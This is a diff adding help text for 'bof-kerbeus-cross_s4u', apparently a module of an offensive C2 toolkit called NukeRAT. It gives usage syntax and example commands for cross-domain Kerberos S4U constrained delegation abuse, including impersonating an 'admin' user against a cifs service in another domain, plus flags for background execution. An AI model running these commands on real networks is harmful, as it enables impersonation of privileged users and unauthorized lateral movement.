@@ -1,0 +1,14 @@
+ABOUT
+    Perform cross domain S4U constrained delegation abuse.
+USAGE:
+    bof-kerbeus-cross_s4u --- /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]
+
+EXAMPLES:
+    bof-kerbeus-cross_s4u --- /ticket:BASE64 /service:cifs/target /targetdomain:other.corp /targetdc:dc2.other.corp /impersonateuser:admin
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-kerbeus-cross_s4u -w 60 --- /ticket:BASE64 /service:cifs/target /targetdomain:other.corp /targetdc:dc2.other.corp /impersonateuser:admin
